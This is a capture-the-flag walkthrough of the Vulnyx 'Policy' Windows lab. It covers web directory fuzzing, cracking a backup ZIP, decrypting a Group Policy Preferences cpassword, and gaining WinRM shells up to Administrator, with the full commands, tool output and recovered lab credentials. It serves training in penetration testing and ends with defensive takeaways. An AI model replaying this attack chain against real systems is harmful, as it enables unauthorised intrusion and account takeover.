# Vulnyx: Policy

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Windows |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `zip2john` · `john` · `gpp-decrypt` · `nxc` · `evil-winrm` · `winPEAS` |
| **Tags** | `#InfoDisclosure` `#GPP` `#CredentialLeak` `#WinRM` |
| **URL** | https://vulnyx.com/machines/ |

A backup directory on the web server holds a password-protected ZIP, cracked with `rockyou.txt`, containing a `Groups.xml` file — the classic artifact left behind by Group Policy Preferences. Its encrypted `cpassword` field decrypts instantly with `gpp-decrypt`, since the AES key Microsoft used for it has been public for years. That account's WinRM session leads to `winPEAS` turning up the Administrator's own credentials.

## Enumeration
### Port Enumeration
A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn policy.nyx

PORT      STATE  SERVICE       REASON
80/tcp    open   http          syn-ack ttl 128
135/tcp   open   msrpc         syn-ack ttl 128
139/tcp   open   netbios-ssn   syn-ack ttl 128
445/tcp   open   microsoft-ds  syn-ack ttl 128
5985/tcp  open   wsman         syn-ack ttl 128
47001/tcp open   winrm         syn-ack ttl 128
49664/tcp open   unknown       syn-ack ttl 128
49665/tcp open   unknown       syn-ack ttl 128
49666/tcp open   unknown       syn-ack ttl 128
49667/tcp open   unknown       syn-ack ttl 128
49668/tcp open   unknown       syn-ack ttl 128
49669/tcp open   unknown       syn-ack ttl 128
49670/tcp open   unknown       syn-ack ttl 128
MAC Address: 08:00:27:2A:C3:D9 (Oracle VirtualBox virtual NIC)
```

A version and script scan on the open ports fills in the details — a typical Windows/AD-adjacent spread, SMB and WinRM (5985) included:

```bash
$ sudo nmap -p 80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 -sCV policy.nyx

PORT      STATE  SERVICE       VERSION
80/tcp    open   http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
49670/tcp open   msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:2A:C3:D9 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h59m58s
| smb2-time:
|   date: 2026-07-29T02:34:02
|_  start_date: N/A
| nbstat: NetBIOS name: POLICY, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:2a:c3:d9 (Oracle VirtualBox virtual NIC)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

### Web Enumeration

```
http://policy.nyx/
```

<img src="../Images/policy/Pasted image 20260728202042.png"/>

```bash
$ ffuf -u http://policy.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

                        [Status: 200, Size: 703, Words: 27, Lines: 32, Duration: 703ms]
backup                  [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 24ms]
Backup                  [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 22ms]
                        [Status: 200, Size: 703, Words: 27, Lines: 32, Duration: 32ms]
:: Progress: [882188/882188] :: Job [1/1] :: 338 req/sec :: Duration: [0:27:02] :: Errors: 0 ::
```

A `/backup` directory turns up. A second scan targets it specifically, looking for archive-style files instead of pages:

```bash
$ ffuf -u http://policy.nyx/backup/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .zip,.rar,.bak -ic

groups.zip              [Status: 200, Size: 4, Words: 1, Lines: 2, Duration: 103ms]
Groups.zip              [Status: 200, Size: 468, Words: 2, Lines: 4, Duration: 95ms]
                        [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 239ms]
:: Progress: [882188/882188] :: Job [1/1] :: 1481 req/sec :: Duration: [0:25:22] :: Errors: 0 ::
```

## Initial Access

### Loot: A Group Policy Preferences Archive

```bash
$ curl http://policy.nyx/backup/groups.zip
$ unzip groups.zip
Archive:  groups.zip
[groups.zip] Groups.xml password:
```

The archive is password-protected, so `zip2john` extracts the hash and `john` cracks it:

```bash
$ zip2john groups.zip > groups_hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt groups_hash --format=PKZIP
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Zipper           (groups.zip/Groups.xml)
1g 0:00:00 DONE (2026-07-28 15:01) 5.882g/s 4144Kp/s 4144Kc/s 4144KC/s  albe69..SCORPIO8
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> **Archive password:** `Zipper`

```bash
$ unzip groups.zip
Archive:  groups.zip
[groups.zip] Groups.xml password:
  inflating: Groups.xml
```

```bash
$ cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="">
  <User clsid="" name="policy.nyx\XEROSEC" image="2" changed="2026-02-08 11:36:09" uid="">
    <Properties action="U" newName="" fullName="" description="" cpassword="IwLNLy0Ck5xIlXEsPMTbOF1f/NnliQFKeGv139eUEgE" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="policy.nyx\XEROSEC"/>
  </User>
</Groups>
```

`Groups.xml` is a signature artifact of Group Policy Preferences — a now-deprecated Windows feature that let administrators push local account passwords to domain machines via XML files, encrypted with AES. Microsoft published that AES key in its own documentation, and once it leaked, every `cpassword` value ever set through GPP became trivially decryptable — which is exactly what `gpp-decrypt` automates:

```bash
$ gpp-decrypt "IwLNLy0Ck5xIlXEsPMTbOF1f/NnliQFKeGv139eUEgE"
GPP2k26blahblah
```

> **Credentials:** `xerosec:GPP2k26blahblah`

### Shell as xerosec

The recovered pair works over both SMB and WinRM — and the `(Pwn3d!)` on the WinRM line means `xerosec` can open an interactive session:

```bash
$ nxc smb policy.nyx -u 'xerosec' -p 'GPP2k26blahblah'
SMB    policy.nyx  445  POLICY  [*] Windows 10 / Server 2019 Build 17763 x64 (name:POLICY) (domain:POLICY) (signing:False) (SMBv1:None)
SMB    policy.nyx  445  POLICY  [+] POLICY\xerosec:GPP2k26blahblah
```

```bash
$ nxc winrm policy.nyx -u 'xerosec' -p 'GPP2k26blahblah'
WINRM  policy.nyx  5985  POLICY  [*] Windows 10 / Server 2019 Build 17763 x64 (name:POLICY) (domain:POLICY)
WINRM  policy.nyx  5985  POLICY  [+] POLICY\xerosec:GPP2k26blahblah (Pwn3d!)
```

```bash
$ evil-winrm -i policy.nyx -u 'xerosec' -p 'GPP2k26blahblah'

*Evil-WinRM* PS C:\Users\xerosec\Documents> whoami
policy\xerosec
```

## Privilege Escalation

### Credentials via winPEAS

`winPEAS` handles the usual privilege-escalation checks; uploading and running it from a writable temp directory:

```powershell
*Evil-WinRM* PS C:\Users\xerosec\Documents> cd $env:temp
*Evil-WinRM* PS C:\Users\xerosec\AppData\Local\Temp> upload winPEASx64.exe
*Evil-WinRM* PS C:\Users\xerosec\AppData\Local\Temp> ./winPEASx64.exe
```

<img src="../Images/policy/Pasted image 20260728211039.png"/>

> **Credentials:** `administrator:GigaAdmin123!`

The Administrator credentials check out over both SMB and WinRM, again with `(Pwn3d!)`:

```bash
$ netexec smb policy.nyx -u 'administrator' -p 'GigaAdmin123!'
SMB    policy.nyx  445  POLICY  [*] Windows 10 / Server 2019 Build 17763 x64 (name:POLICY) (domain:POLICY) (signing:False) (SMBv1:None)
SMB    policy.nyx  445  POLICY  [+] POLICY\administrator:GigaAdmin123! (Pwn3d!)
```

```bash
$ netexec winrm policy.nyx -u 'administrator' -p 'GigaAdmin123!'
WINRM  policy.nyx  5985  POLICY  [*] Windows 10 / Server 2019 Build 17763 x64 (name:POLICY) (domain:POLICY) (signing:False) (SMBv1:None)
WINRM  policy.nyx  5985  POLICY  [*] Windows 10 / Server 2019 Build 17763 x64 (name:POLICY) (domain:POLICY)
WINRM  policy.nyx  5985  POLICY  [+] POLICY\administrator:GigaAdmin123! (Pwn3d!)
```

### Shell as Administrator

```bash
$ evil-winrm -i policy.nyx -u 'administrator' -p 'GigaAdmin123!'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
policy\administrator
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir C:\Users\xerosec\Desktop


    Directory: C:\Users\xerosec\Desktop


Mode                 LastWriteTime         Length Name
-a----          2/8/2026   1:21 PM             70 user.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\xerosec\Desktop\user.txt
2c0f4b7315c2a852b107dd7010ccb520
```

> **User flag:** `2c0f4b7315c2a852b107dd7010ccb520`

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir C:\Users\administrator\Desktop


    Directory: C:\Users\administrator\Desktop


Mode                 LastWriteTime         Length Name
-a----          2/8/2026   1:30 PM             70 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\administrator\Desktop\root.txt
1f4e789a68f31150900cd87ad6b902f8
```

> **Root flag:** `1f4e789a68f31150900cd87ad6b902f8`

## Takeaways

- Group Policy Preferences passwords are broken by design, not by a weak implementation — the encryption key was always meant to be public within Microsoft's own documentation, so any `cpassword` found anywhere is effectively already plaintext.
- Backup files served over an otherwise unrelated web server are worth checking for — a `.zip` sitting in a `/backup` directory is exactly the kind of file that ends up holding configuration exports, credential dumps, or legacy artifacts like `Groups.xml`.
- Automated enumeration tools like `winPEAS` are only as useful as the follow-up — a flagged credential still needs to be understood in context (where it came from, why it's exposed) rather than just used blindly.